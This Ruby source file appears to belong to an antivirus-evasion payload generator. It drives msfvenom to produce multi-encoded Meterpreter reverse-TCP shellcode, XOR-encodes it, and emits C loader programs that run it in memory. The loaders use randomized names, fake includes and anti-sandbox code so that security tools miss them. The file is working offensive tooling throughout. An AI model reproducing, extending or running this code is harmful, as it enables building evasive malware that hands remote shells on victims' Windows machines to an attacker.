#!/usr/bin/env ruby
# -*- coding: binary -*-
# Code by Green-m
# Test  on ruby 2.3.3
$LOAD_PATH.unshift(File.dirname(__FILE__))
require 'encoder'
require 'antisandbox'

class PayloadMaker

    def initialize(shellcode,encoder=true)
        @shellcode = shellcode
        @encoder = encoder
        #@platform = platform
    end

    def fake_includes

        @@fake_includes_all = ["#include <ctype.h>","#include <time.h> ","#include <math.h>","#include <signal.h>","#include <stdarg.h>",
                         "#include <limits.h>","#include <assert.h>","#include <stdio.h>","#include <stdlib.h>","#include <string.h>"]

        fake_includes = []
        @@fake_includes_all.length.times do 
            fake_includes << @@fake_includes_all.sample
        end
        fake_includes.uniq!
    end

    def random_memory
        # random memory size 
        memory_size = random_number(@shellcode.length..10000)

    end

    def compile_function1 #VirtualAllocEx
        shellcode = @shellcode
        rand_buf = random_funcname()
        rand_name1 = random_funcname()
        rand_name2 = random_funcname()
        rand_name3 = random_funcname()
        rand_name4 = random_funcname()
        encoded_code = shellcode
        decoded_code = ""

        # if Encoder is set 
        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder
=begin        
        encoded_code = encoder.encoded_code ||shellcode
        decoded_code = encoder.decoded_code ||""
        rand_buf = encoder.shellcode_name
=end
        # define variables
        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
        string_mod_functions = ["LPVOID #{rand_name1};\n","HANDLE #{rand_name2};\n","SIZE_T #{rand_name3};\n","BOOL #{rand_name4} = FALSE;\n"].shuffle!.join()

        # random memory size 
        #memory_size = random_number(shellcode.length..100000)

        # add includes
        code = "#include <windows.h>\n"
        code << fake_includes.join("\n")

        # add shellcode 
        code << "\n" + encoded_code + "\n"

        # if Encoder is not set,add the raw shellcode 
        #code << "\n" + shellcode + "\n"

        # main function
        code << "int main(){\n"

        
        # anti sandbox obfuscate code
        output_status "Adding anti sandbox obfuscate code."
        code << AntiSandBox::random_obfuscate


        # decode shellcode
        code <<  decoded_code + "\n"

        # Declare variables
        code << string_mod_functions

        # run shellcode functions
        code << "#{rand_name2} = GetCurrentProcess();\n"
        code << "#{rand_name1} = VirtualAllocEx(#{rand_name2}, NULL, sizeof(#{random_memory}), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
        code << "#{rand_name4} = WriteProcessMemory(#{rand_name2}, #{rand_name1}, (LPCVOID)&#{rand_buf}, sizeof(#{rand_buf}), &#{rand_name3});\n"
        code << "((void(*)())#{rand_name1})();\n"
        code << "return 0;\n"
        code << "}"

    end

    def compile_function2 # VirtualProtect
        shellcode = @shellcode
        rand_buf = random_funcname()
        rand_name1 = random_funcname()
        rand_name2 = random_funcname()
        rand_name3 = random_funcname()
        rand_name4 = random_funcname()
        encoded_code = shellcode
        decoded_code = ""

        # strip shellcode prefix to encode
        #shellcode.sub!('unsigned char buf[] = ',"")

        # if Encoder is set 
        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder

        # define variables
        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
        string_mod_functions = ["byte *#{rand_name1} = #{rand_buf};\n","DWORD #{rand_name2} = 0;\n","typedef void (WINAPI *#{rand_name3})();\n"].shuffle!.join()

       

        

        code = "#include <windows.h>\n"
        code << fake_includes.join("\n")

        
        code << "\n" + encoded_code + "\n"

        # if Encoder is not set,add the raw shellcode 

        #code << "\n" + shellcode + "\n"

        # main function
        code << "int main(){\n"


        # anti sandbox obfuscate code
        output_status "Adding anti sandbox obfuscate code."
        code << AntiSandBox::random_obfuscate

        # decode shellcode
        code <<  decoded_code + "\n"

        # Declare variables
        code << string_mod_functions

        # run shellcode functions
        code << "VirtualProtect(#{rand_name1},sizeof(#{random_memory}),PAGE_EXECUTE_READWRITE,&#{rand_name2});\n"  
        code << "#{rand_name3} #{rand_name4} = (#{rand_name3})&#{rand_buf}[0];\n"
        code << "#{rand_name4}();\n"
        code << "return 0;"
        code << "}"
    end

    def compile_function3 # heap
        shellcode = @shellcode
        rand_buf = random_funcname()
        rand_name1 = random_funcname()
        rand_name2 = random_funcname()
        encoded_code = shellcode
        decoded_code = ""



        # if Encoder is set 
        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder

        # define variables
        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
        string_mod_functions = ""
       

        

        code = "#include <windows.h>\n"
        code << fake_includes.join("\n")

        
        code << "\n" + encoded_code + "\n"

        # if Encoder is not set,add the raw shellcode 

        #code << "\n" + shellcode + "\n"

        # main function
        code << "int main(){\n"


        # anti sandbox obfuscate code
        output_status "Adding anti sandbox obfuscate code."
        code << AntiSandBox::random_obfuscate

        # decode shellcode
        code <<  decoded_code + "\n"

        # Declare variables
        code << string_mod_functions

        # run shellcode functions
        code << "HANDLE #{rand_name1} = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(#{rand_buf}),0);\n"
        code << "LPVOID #{rand_name2} = (LPVOID)HeapAlloc(#{rand_name1},HEAP_ZERO_MEMORY,sizeof(#{rand_buf}));\n"
        code << "memcpy(#{rand_name2},#{rand_buf},sizeof(#{rand_buf}));\n"
        code << "(*(void(*)())#{rand_name2})();\n"
        code << "return 0;\n"
        code << "}"
    end

    def compile_function4 # GetModuleHandle
        shellcode = @shellcode
        rand_buf = random_funcname()
        rand_name1 = random_funcname()
        rand_name2 = random_funcname()
        rand_name3 = random_funcname()
        encoded_code = shellcode
        decoded_code = ""



        # if Encoder is set 
        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder

        # define variables
        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
        string_mod_functions = ""
       

        

        code = "#include <windows.h>\n"
        code << fake_includes.join("\n")

        
        code << "\n" + encoded_code + "\n"

        # if Encoder is not set,add the raw shellcode 

        #code << "\n" + shellcode + "\n"

        # main function
        code << "int main(){\n"


        # anti sandbox obfuscate code
        output_status "Adding anti sandbox obfuscate code."
        code << AntiSandBox::random_obfuscate

        # decode shellcode
        code <<  decoded_code + "\n"

        # Declare variables
        code << string_mod_functions

        # run shellcode functions
        code << "typedef int (__stdcall *#{rand_name3})(LPVOID,SIZE_T,DWORD,DWORD); \n"
        code << %Q{#{rand_name3} #{rand_name1} = (#{rand_name3}) GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");\n}
        code << "LPVOID #{rand_name2} = (LPVOID)#{rand_name1}(NULL, sizeof(#{rand_buf}), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n"
        code << "memcpy(#{rand_name2},#{rand_buf},sizeof(#{rand_buf}));\n"
        code << "(*(void(*)())#{rand_name2})();\n"
        code << "return 0;\n"
        code << "}"
    end


    def compile_function5 # CreateThread
        shellcode = @shellcode
        rand_buf = random_funcname()
        rand_name1 = random_funcname()
        encoded_code = shellcode
        decoded_code = ""



        # if Encoder is set 
        encoded_code,decoded_code,rand_buf = Encoder::Xor.new(shellcode).generate if @encoder

        # define variables
        shellcode.sub!('unsigned char buf[] = ',"unsigned char #{rand_buf}[] = ")
        string_mod_functions = ""
       

        

        code = "#include <windows.h>\n"
        code << fake_includes.join("\n")

        
        code << "\n" + encoded_code + "\n"

        # if Encoder is not set,add the raw shellcode 

        #code << "\n" + shellcode + "\n"

        # main function
        code << "int main(){\n"


        # anti sandbox obfuscate code
        output_status "Adding anti sandbox obfuscate code."
        code << AntiSandBox::random_obfuscate

        # decode shellcode
        code <<  decoded_code + "\n"

        # Declare variables
        code << string_mod_functions

        # run shellcode functions
        code << "LPVOID #{rand_name1} = (LPVOID)VirtualAlloc(NULL, sizeof(#{rand_buf}), MEM_COMMIT, PAGE_EXECUTE_READWRITE); \n"
        code << "memcpy(#{rand_name1},#{rand_buf},sizeof(#{rand_buf}));\n"
        code << "CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(#{rand_name1}),NULL,0,NULL);\n"
        code << "while(TRUE){Sleep(100);}\n"
        code << "return 0;\n"
        code << "}"
    end

    def compile_random
        compile_functions = []
        self.methods.each {|x|
            compile_functions << x if x.to_s.include?'compile_function'
        }

        output_status "Generating sample code."
        #compile_function5
        send(compile_functions.sample)
    end

end


class MsfRunner
    def initialize(payload='windows/meterpreter/reverse_tcp',host='127.0.0.1',port='4444',others='',debug=false)
        @payload = payload 
        @host = host 
        @port = port  
        @others = others
        @debug = debug
        #@platform = platform
    end

    def get_encoder
        encoder_array_all = ["x86/bloxor",
                            "x86/call4_dword_xor",
                            "x86/countdown",
                            "x86/fnstenv_mov",
                            "x86/jmp_call_additive",
                            "x86/shikata_ga_nai"]
                            
                            
        encoder_array = ["x86/shikata_ga_nai"]
        encoder_array << encoder_array_all.sample
        encoder_array << encoder_array_all.sample
    end

    def msf_check
        msfstring = "msfvenom -h"

        begin
            stdin, stdout, stderr = Open3.popen3(msfstring)
        rescue Exception => e
            output_bad "Metasploit not found, please check or reinstall it."
            exit
        end

    end

    def run
        msf_check()
        encoder_array = get_encoder
        msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(10..15)} |"
        msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} |"
        msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)}"

        # debug
        #msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e x86/jmp_call_additive -i #{random_number(10..15)} "

        output_status "Retrieve shellcode from metasploit.."
        output_line msfstring if @debug
        

        begin
            for i in 1..3
                stdin, stdout, stderr = Open3.popen3(msfstring) 
                shellcode = stdout.read
                stderr = stderr.read
                payload_size = stderr.lines[-2]

                output_line shellcode if @debug
                output_line stderr if @debug
 
                unless shellcode.blank?
                    if payload_size.include?("Payload size") && (payload_size.scan(/\d+/)[0].to_i > 300)
                        break
                    end
                else
                    output_warning "Generating code failed because of metasploit, retrying ..."
                end
            end
        rescue Exception => e
            output_bad "some error occured when running metasploit"
            output_bad e.message
            exit
        end

        
        

        # payload size
        output_line payload_size



        shellcode
    end

end